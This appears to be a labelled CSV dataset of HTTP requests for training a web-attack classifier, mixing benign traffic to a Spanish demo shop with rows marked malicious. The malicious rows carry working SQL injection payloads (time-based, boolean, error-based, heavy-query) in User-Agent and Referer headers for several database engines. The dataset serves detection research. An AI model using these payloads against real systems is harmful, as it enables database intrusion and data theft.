method,url,uri,query,headers,body,type
GET,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,modo=registro&login=popp&password=MI21n&nombre=Baldomero&apellidos=Castellar+Cutrina&email=raynaud.springson9%40enmallorca.com.za&dni=90807199W&direccion=Maestro+Serrano+36%2C+&ciudad=Alcudia+de+Veo&cp=37175&provincia=Barcelona&ntc=0928475197859269&B1=Registrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FA1EDE9E5A4D817DA5DC0B3BAC7DC6FD,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' WHERE 2250=2250 OR CHAR(113)||CHAR(119)||CHAR(76)||CHAR(72)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9891),0),5000000000),NULL)-- HEFl
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"" OR 2620=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND ""lzKc"" LIKE ""lzKc
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/cmenbul.gif,/tienda1/imagenes/cmenbul.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FD16E3B5354CCCC4B80B519D13769572,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5') AS iWGh WHERE 7583=7583 AND 5222=4107%16
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5'))) OR CHAR(113)||CHAR(119)||CHAR(76)||CHAR(72)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9891),0),5000000000),NULL) AND ((('hmLQ' LIKE 'hmLQ
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: -5278')) OR (SELECT (CASE WHEN (4422=4422) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,4422) END) FROM DUAL) IS NULL AND (('fNDU'='fNDU
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/productos.jsp,/tienda1/publico/productos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=DD8BF6FA09EB056DBD82802C42DEB357,,benign
GET,/tienda1/imagenes/2.gif,/tienda1/imagenes/2.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=313886E787D9B5A2F1B04250A5D8D560,,benign
GET,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,id=1,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=0EC356F359BA7EB58BE1AD5921C4F75F,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5') AS MVxG WHERE 3954=3954 AND 4416=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)-- iKKS
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,id=1,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=76B2B4B409D115933A075A2847A33F75,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/'))) AND 5685=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3) AND ((('qnNQ'='qnNQ
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=38B139075248B85B5F9D37FFA5D16DB7,modo=insertar&precio=9369&B1=Pasar+por+caja,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/,(SELECT (CASE WHEN (5435=5435) THEN (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) ELSE 1/(SELECT 0 FROM DUAL) END) FROM DUAL)
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5) AND 1763=DBMS_PIPE.RECEIVE_MESSAGE(CHR(112)||CHR(121)||CHR(116)||CHR(83),5) AND (3733=3733
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -3275"")) OR 1263=1263 AND ((""QavU"" LIKE ""QavU
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/caracteristicas.jsp,/tienda1/publico/caracteristicas.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=51EAAF122CB1808925DD71002877CA8B,id=1,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/) HAVING 3930=2962 AND (3676=3676
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/global/titulo.jsp,/tienda1/global/titulo.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=F5F9A15EC5B4A886440471D183D139B2,,benign
GET,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,id=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=32&B1=A%F1adir+al+carrito,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=562039F460543AE5EF19351FA1E71D56,,benign
GET,/tienda1/miembros/fotos.jsp,/tienda1/miembros/fotos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=129FE7056ADD2DE5980644040EE8E086,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -1851"")) OR CASE WHEN 8699=3904 THEN 8699 ELSE JSON(CHAR(113,88,117,78)) END AND ((""cyll""=""cyll
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/index.jsp,/tienda1/index.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A5AE51A7D0D97219963EBDA0C5F787E0,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5'))) AND ELT(5698=4160,4160) AND ((('IqVW'='IqVW
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: -7065') OR 7090=1043 AND ('biyw' LIKE 'biyw
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/index.jsp,/tienda1/miembros/index.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=5055F1371488C78E197783EE3017F3EA,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5'))) OR CHAR(83)||CHAR(68)||CHAR(105)||CHAR(88)=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY(CHAR(65)||CHAR(69)||CHAR(83),NULL),0),500000000),NULL) AND ((('byrh' LIKE 'byrh
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/cmenbul.gif,/tienda1/imagenes/cmenbul.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=87369FA5E56C196601EA4BAD70E6E2E0,,benign
GET,/tienda1/publico/productos.jsp,/tienda1/publico/productos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=B6E45A031D0B61C652643B2434A9D995,,benign
GET,/tienda1/publico/vaciar.jsp,/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A512476B8831E4CCED08A03A85B857C7,,benign
POST,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=730065B3950D528BDFEF1E2DC6FE9441,modo=entrar&login=juni&pwd=d8E1PENo0A5&remember=off&B1=Entrar,benign
GET,/tienda1/publico/carrito.jsp,/tienda1/publico/carrito.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=0AAEDB949B9925C764D31C2A4FFA1E45,,benign
POST,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=F7A4B408891E747255977372415EDD6E,modo=insertar&precio=3055&B1=Pasar+por+caja,benign
GET,/tienda1/miembros/imagenes/zarauz.jpg,/tienda1/miembros/imagenes/zarauz.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=010DCAF9279561D968605F8ABF366614,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5')) OR (SELECT 7994 FROM (SELECT(SLEEP(5)))sfOn) AND (('JiXh' LIKE 'JiXh
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' AND ELT(1926=4431,4431)-- CYEb
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/miembros/imagenes/ogono.jpg,/tienda1/miembros/imagenes/ogono.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=C33F59019D3E710D23EE8074F6EAC189,,benign
GET,/tienda1/miembros/editar.jsp,/tienda1/miembros/editar.jsp,modo=registro&login=aud&password=k1n&nombre=Tristana&apellidos=Xarau+Egidos&email=mull%40sexotelefono.es&dni=97036086Y&direccion=Transito+De+Las+Ballenas+30%2C+&ciudad=Mahamud&cp=06185&provincia=Tarragona&ntc=9379365296048571&B1=Registrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=C16E370E744602E88C54575ED813B920,,benign
GET,/tienda1/imagenes/3.gif,/tienda1/imagenes/3.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=5CDB1AAC36EB550CB98A321C96083DBE,,benign
GET,/tienda1/imagenes/logo.gif,/tienda1/imagenes/logo.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=DFF7954B9CCB130ACB227D93A66A5D75,,benign
GET,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,id=2&nombre=Vino+Rioja&precio=85&cantidad=41&B1=A%F1adir+al+carrito,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=FA343E576A3BBEA99621CE57AC5DE3FE,,benign
GET,/tienda1/miembros/imagenes/ogono.jpg,/tienda1/miembros/imagenes/ogono.jpg,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=B74ED0574E3C3FAD43DBD94557F10687,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' OR CHAR(113)||CHAR(119)||CHAR(76)||CHAR(72)=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(9891),0),5000000000),NULL)-- nLCg
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/ AND (SELECT (CASE WHEN (1814=1804) THEN NULL ELSE CAST((CHR(118)||CHR(100)||CHR(90)||CHR(76)) AS NUMERIC) END)) IS NULL
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/3.gif,/tienda1/imagenes/3.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=53722C038915C855959A8656549A6FB8,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' AND SLEEP(5) OR 'vZBc'='wtcP
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/cmenbul.gif,/tienda1/imagenes/cmenbul.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A8178532F62F385B2C9A716E17C24240,,benign
POST,/tienda1/publico/vaciar.jsp,/tienda1/publico/vaciar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=52EBC512524E95D76B57BC63B696F18A,B2=Vaciar+carrito,benign
POST,/tienda1/publico/autenticar.jsp,/tienda1/publico/autenticar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=A95B2AF8FE9EA23BBDF5E0E8545B4D04,modo=entrar&login=frayda&pwd=422RdO&remember=off&B1=Entrar,benign
GET,/tienda1/global/creditos.jsp,/tienda1/global/creditos.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=F6F2BFD9590FAE6B84F154B59E23FAF8,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5' OR 7035=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)-- vNjL
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/2.gif,/tienda1/imagenes/2.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=D0B6B5CB7FC2A3BB90E79BE790E7C47A,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/"" AND (SELECT (CASE WHEN (6210=5873) THEN NULL ELSE CAST((CHR(103)||CHR(114)||CHR(87)||CHR(69)) AS NUMERIC) END)) IS NULL AND ""xQAv"" LIKE ""xQAv
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/miembros.jsp,/tienda1/publico/miembros.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=EF1703A548DE4D5DAE24C70A33EF667F,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/' IN BOOLEAN MODE) AND MAKE_SET(4771=3409,3409)#
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
POST,/tienda1/publico/anadir.jsp,/tienda1/publico/anadir.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=24CEDDD78E57784CE37D2D5C3ECEA806,id=1&nombre=Vino+Rioja&precio=39&cantidad=89&B1=A%F1adir+al+carrito,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5 OR 2620=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)# qQov
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/publico/registro.jsp,/tienda1/publico/registro.jsp,modo=registro&login=delage&password=7A2o0&nombre=Medardo&apellidos=Canaleta+Pahisa&email=bolas%40vestidos-de-novias-y-bebes.zw&dni=56999575D&direccion=Avda.+Doctor+Gadea+75%2C+10%3FC&ciudad=Meis&cp=39213&provincia=C%E1ceres&ntc=2677666876528376&B1=Registrar,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=F8F68D6F578A9E93D9B94BBEC3EF61EA,,benign
POST,/tienda1/publico/pagar.jsp,/tienda1/publico/pagar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=50726BC001725EFBDF1D02187EBE7F25,modo=insertar&precio=8981&B1=Pasar+por+caja,benign
POST,/tienda1/publico/entrar.jsp,/tienda1/publico/entrar.jsp,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=B330F39ADD1B9CD1C655C3B0694D090D,errorMsg=Credenciales+incorrectas,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: https://sqli-labs.bachang.org/'))) AND 5019=(SELECT COUNT(fuzzBits(char(73)||char(109)||char(84)||char(76), 0.001)) FROM numbers(1000000)) AND ((('cyzc'='cyzc
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5"") OR (SELECT 4210 FROM (SELECT(SLEEP(5)))zadA)#
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/tienda1/imagenes/2.gif,/tienda1/imagenes/2.gif,,localhost:8080 Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) JSESSIONID=350A3DD2C790AA460DE1A21B9FEAB395,,benign
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5
Referer: -7986"") OR (SELECT (CASE WHEN (5739=5739) THEN NULL ELSE CAST((CHR(102)||CHR(103)||CHR(88)||CHR(87)) AS NUMERIC) END)) IS NULL AND (""XURM"" LIKE ""XURM
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5 OR ELT(9099=9099,SLEEP(5))-- Yuuo
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
GET,/,/,,"Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.9) Gecko/2009042113 Ubuntu/8.10 (intrepid) Firefox/3.0.9 GTB5%' RLIKE (SELECT (CASE WHEN (4029=7036) THEN 0x4d6f7a696c6c612f352e3020285831313b20553b204c696e757820693638363b20656e2d55533b2072763a312e392e302e3929204765636b6f2f32303039303432313133205562756e74752f382e31302028696e747265706964292046697265666f782f332e302e392047544235 ELSE 0x28 END)) AND 'nQKu%'='nQKu
Referer: https://sqli-labs.bachang.org/
Cookie: p_uv_id=ddff9cf6c0f7ede00fb5629bd2ed0ae2
Host: sqli-labs.bachang.org
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close",,malicious
